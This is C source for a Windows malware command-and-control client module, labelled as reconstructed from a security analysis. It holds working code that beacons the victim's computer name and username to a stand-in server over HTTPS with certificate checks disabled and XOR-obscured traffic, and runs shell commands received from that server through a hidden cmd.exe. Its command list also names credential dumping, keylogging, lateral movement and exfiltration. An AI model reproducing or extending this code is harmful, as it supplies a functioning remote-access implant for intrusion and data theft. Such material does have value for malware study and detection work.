/**
 * PE #1 - C2 Client Module
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This module handles Command & Control communication.
 * Supports multiple C2 channels:
 * 1. DNS tunneling (via PE #2)
 * 2. HTTPS direct connection
 * 3. HTTP fallback
 * 
 * C2 Keywords found in analysis:
 * - I0C2, M{C2, BoT``, 7C2,, (C2R@, T^ c2, C2!R
 */

#include "loader.h"
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

//=============================================================================
// C2 PROTOCOL DEFINITIONS
//=============================================================================

// Command types
typedef enum _C2_COMMAND_TYPE {
    CMD_NOP         = 0x00,     // No operation
    CMD_PING        = 0x01,     // Heartbeat/beacon
    CMD_SHELL       = 0x02,     // Execute shell command
    CMD_DOWNLOAD    = 0x03,     // Download file to victim
    CMD_UPLOAD      = 0x04,     // Upload file from victim
    CMD_INJECT      = 0x05,     // Inject shellcode
    CMD_MIGRATE     = 0x06,     // Migrate to another process
    CMD_KEYLOG      = 0x07,     // Start/stop keylogger
    CMD_SCREENSHOT  = 0x08,     // Take screenshot
    CMD_PERSIST     = 0x09,     // Update persistence
    CMD_UPDATE      = 0x0A,     // Update payload
    CMD_UNINSTALL   = 0x0B,     // Remove malware
    CMD_SYSINFO     = 0x0C,     // Collect system info
    CMD_LSASS_DUMP  = 0x0D,     // Dump LSASS (credential theft)
    CMD_LATERAL     = 0x0E,     // Lateral movement
    CMD_EXFIL       = 0x0F      // Data exfiltration
} C2_COMMAND_TYPE;

// C2 packet header
#pragma pack(push, 1)
typedef struct _C2_PACKET_HEADER {
    DWORD   Magic;              // 0x43324B50 ('C2KP')
    DWORD   SessionId;
    WORD    CommandType;
    WORD    Flags;
    DWORD   PayloadSize;
    DWORD   Checksum;
} C2_PACKET_HEADER, *PC2_PACKET_HEADER;
#pragma pack(pop)

#define C2_MAGIC        0x43324B50  // 'C2KP'

//=============================================================================
// GLOBALS
//=============================================================================

static DWORD g_SessionId = 0;
static BOOL g_C2Connected = FALSE;
static CRITICAL_SECTION g_C2Lock;
static WCHAR g_C2Server[256] = {0};
static USHORT g_C2Port = 443;

//=============================================================================
// C2 CONNECTION
//=============================================================================

/**
 * Initialize C2 session.
 */
static BOOL 
C2_Initialize(VOID)
{
    InitializeCriticalSection(&g_C2Lock);
    
    // Generate random session ID
    g_SessionId = GetTickCount() ^ GetCurrentProcessId();
    
    return TRUE;
}

/**
 * Calculate packet checksum.
 */
static DWORD 
C2_Checksum(
    PBYTE Data,
    DWORD Size
)
{
    DWORD checksum = 0;
    DWORD i;
    
    for (i = 0; i < Size; i++) {
        checksum = (checksum << 5) | (checksum >> 27);
        checksum ^= Data[i];
    }
    
    return checksum;
}

/**
 * XOR encrypt/decrypt C2 data.
 */
static VOID 
C2_XorCrypt(
    PBYTE Data,
    DWORD Size,
    DWORD Key
)
{
    DWORD i;
    BYTE keyBytes[4];
    
    keyBytes[0] = (Key >> 24) & 0xFF;
    keyBytes[1] = (Key >> 16) & 0xFF;
    keyBytes[2] = (Key >> 8) & 0xFF;
    keyBytes[3] = Key & 0xFF;
    
    for (i = 0; i < Size; i++) {
        Data[i] ^= keyBytes[i % 4];
    }
}

//=============================================================================
// HTTPS C2
//=============================================================================

/**
 * Send data to C2 via HTTPS.
 */
static BOOL 
C2_SendHTTPS(
    LPCWSTR Server,
    USHORT Port,
    PBYTE Data,
    DWORD DataSize,
    PBYTE* Response,
    PDWORD ResponseSize
)
{
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL success = FALSE;
    DWORD bytesRead;
    PBYTE buffer = NULL;
    DWORD bufferSize = 0x10000;
    
    // Create session
    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    
    if (hSession == NULL) {
        return FALSE;
    }
    
    // Connect
    hConnect = WinHttpConnect(hSession, Server, Port, 0);
    if (hConnect == NULL) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    // Create request (POST to /api/update)
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/api/v1/update",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    
    if (hRequest == NULL) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    // Set security flags to ignore certificate errors (for testing)
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, 
                     &secFlags, sizeof(secFlags));
    
    // Send request
    if (!WinHttpSendRequest(
            hRequest,
            L"Content-Type: application/octet-stream\r\n",
            -1,
            Data,
            DataSize,
            DataSize,
            0)) {
        goto cleanup;
    }
    
    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }
    
    // Read response
    buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
    if (buffer == NULL) {
        goto cleanup;
    }
    
    if (WinHttpReadData(hRequest, buffer, bufferSize, &bytesRead)) {
        if (Response != NULL && ResponseSize != NULL) {
            *Response = buffer;
            *ResponseSize = bytesRead;
            buffer = NULL;  // Transfer ownership
        }
        success = TRUE;
    }
    
cleanup:
    if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    
    return success;
}

//=============================================================================
// BEACON/HEARTBEAT
//=============================================================================

/**
 * Send beacon to C2.
 */
static BOOL 
C2_Beacon(VOID)
{
    C2_PACKET_HEADER header;
    BYTE sysinfo[512];
    DWORD sysinfoSize;
    PBYTE packet = NULL;
    DWORD packetSize;
    PBYTE response = NULL;
    DWORD responseSize;
    BOOL success = FALSE;
    
    // Build system info for beacon
    sysinfoSize = 0;
    
    // Computer name
    DWORD nameSize = 256;
    GetComputerNameA((LPSTR)(sysinfo + sysinfoSize), &nameSize);
    sysinfoSize += nameSize + 1;
    
    // Username
    nameSize = 256;
    GetUserNameA((LPSTR)(sysinfo + sysinfoSize), &nameSize);
    sysinfoSize += nameSize + 1;
    
    // Build packet
    packetSize = sizeof(header) + sysinfoSize;
    packet = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, packetSize);
    if (packet == NULL) {
        return FALSE;
    }
    
    // Fill header
    header.Magic = C2_MAGIC;
    header.SessionId = g_SessionId;
    header.CommandType = CMD_PING;
    header.Flags = 0;
    header.PayloadSize = sysinfoSize;
    header.Checksum = C2_Checksum(sysinfo, sysinfoSize);
    
    CopyMemory(packet, &header, sizeof(header));
    CopyMemory(packet + sizeof(header), sysinfo, sysinfoSize);
    
    // Encrypt packet
    C2_XorCrypt(packet + sizeof(header), sysinfoSize, g_SessionId);
    
    // Send beacon
    success = C2_SendHTTPS(
        g_C2Server,
        g_C2Port,
        packet,
        packetSize,
        &response,
        &responseSize
    );
    
    // Process response (contains commands)
    if (success && response != NULL && responseSize > 0) {
        // Decrypt and process response
        C2_XorCrypt(response, responseSize, g_SessionId);
        // Process commands...
        HeapFree(GetProcessHeap(), 0, response);
    }
    
    HeapFree(GetProcessHeap(), 0, packet);
    return success;
}

//=============================================================================
// COMMAND EXECUTION
//=============================================================================

/**
 * Execute a shell command.
 */
static BOOL 
ExecuteShellCommand(
    LPCSTR Command,
    PBYTE* Output,
    PDWORD OutputSize
)
{
    SECURITY_ATTRIBUTES sa;
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    CHAR cmdLine[MAX_PATH * 2];
    PBYTE buffer = NULL;
    DWORD bufferSize = 0x10000;
    DWORD bytesRead = 0;
    BOOL success = FALSE;
    
    // Create pipe for output
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return FALSE;
    }
    
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    // Setup process
    si.cb = sizeof(si);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    sprintf_s(cmdLine, MAX_PATH * 2, "cmd.exe /c %s", Command);
    
    // Create process
    if (!CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }
    
    CloseHandle(hWritePipe);
    
    // Read output
    buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
    if (buffer != NULL) {
        ReadFile(hReadPipe, buffer, bufferSize - 1, &bytesRead, NULL);
        
        if (Output != NULL && OutputSize != NULL) {
            *Output = buffer;
            *OutputSize = bytesRead;
        } else {
            HeapFree(GetProcessHeap(), 0, buffer);
        }
        success = TRUE;
    }
    
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
    
    return success;
}

/**
 * Execute received C2 command.
 */
BOOL 
PE1_ExecuteCommand(
    PBYTE   Command,
    DWORD   CommandSize,
    PBYTE*  Response,
    PDWORD  ResponseSize
)
{
    PC2_PACKET_HEADER header;
    PBYTE payload;
    BOOL success = FALSE;
    
    if (CommandSize < sizeof(C2_PACKET_HEADER)) {
        return FALSE;
    }
    
    header = (PC2_PACKET_HEADER)Command;
    payload = Command + sizeof(C2_PACKET_HEADER);
    
    // Verify magic
    if (header->Magic != C2_MAGIC) {
        return FALSE;
    }
    
    // Verify checksum
    if (header->Checksum != C2_Checksum(payload, header->PayloadSize)) {
        return FALSE;
    }
    
    // Execute based on command type
    switch (header->CommandType) {
        case CMD_NOP:
            success = TRUE;
            break;
            
        case CMD_PING:
            success = C2_Beacon();
            break;
            
        case CMD_SHELL:
            success = ExecuteShellCommand(
                (LPCSTR)payload,
                Response,
                ResponseSize
            );
            break;
            
        case CMD_SYSINFO:
            // Collect system info
            break;
            
        case CMD_SCREENSHOT:
            // Take screenshot
            break;
            
        case CMD_LSASS_DUMP:
            // Dump LSASS (requires SYSTEM)
            break;
            
        case CMD_UNINSTALL:
            // Remove persistence and exit
            break;
            
        default:
            break;
    }
    
    return success;
}

//=============================================================================
// MAIN C2 LOOP
//=============================================================================

/**
 * Main command-and-control loop.
 * 
 * Beacons to C2 periodically and executes received commands.
 */
VOID 
PE1_CommandLoop(VOID)
{
    DWORD beaconInterval;
    DWORD jitter;
    DWORD waitTime;
    
    // Initialize
    C2_Initialize();
    wcscpy_s(g_C2Server, 256, L"c2.example.com");
    g_C2Port = 443;
    beaconInterval = 60000;  // 60 seconds
    
    while (TRUE) {
        // Send beacon
        C2_Beacon();
        
        // Calculate wait time with jitter (±30%)
        jitter = (beaconInterval * 30) / 100;
        waitTime = beaconInterval + (rand() % (jitter * 2)) - jitter;
        
        // Wait
        Sleep(waitTime);
    }
}
